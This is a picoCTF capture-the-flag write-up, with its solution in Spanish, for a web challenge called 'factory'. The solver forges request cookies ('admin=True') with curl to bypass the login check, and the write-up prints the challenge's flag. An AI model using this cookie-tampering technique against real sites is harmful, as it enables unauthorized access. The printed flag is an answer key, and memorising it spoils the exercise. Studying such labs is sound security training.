
## DESCRIPTION

The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? `https://jupiter.challenges.picoctf.org/problem/15796/` ([link](https://jupiter.challenges.picoctf.org/problem/15796/)) or http://jupiter.challenges.picoctf.org:15796

## HINT

Hmm it doesn't seem to check anyone's password, except for Joe's?

## SOLUTION

Pide el navegador y responde el servidor. Para pedir existen diferentes métodos como POST y GET, son métodos de petición. 


Nos logueamos con usuario cualquiera, copiamos el link y lo ponemos en la consola. 

````

EduardoSanchez-picoctf@webshell:~$ curl https://jupiter.challenges.picoctf.org/problem/15796/flag -H "Cookies: username=juan;  password=juan; admin=True" | grep pico
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0
  0     0    0     0    0     0      0      0 --:--:--  0:00:02 --:--:--     0^C
EduardoSanchez-picoctf@webshell:~$ curl https://jupiter.challenges.picoctf.org/problem/15796/flag -H "Cookie: username=juan;  password=juan; admin=True" | grep pico
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1312  100  1312    0     0   4674      0 --:--:-- --:--:-- --:--:--  4685
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{th3_c0nsp1r4cy_l1v3s_6edb3f5f}</code></p>
```


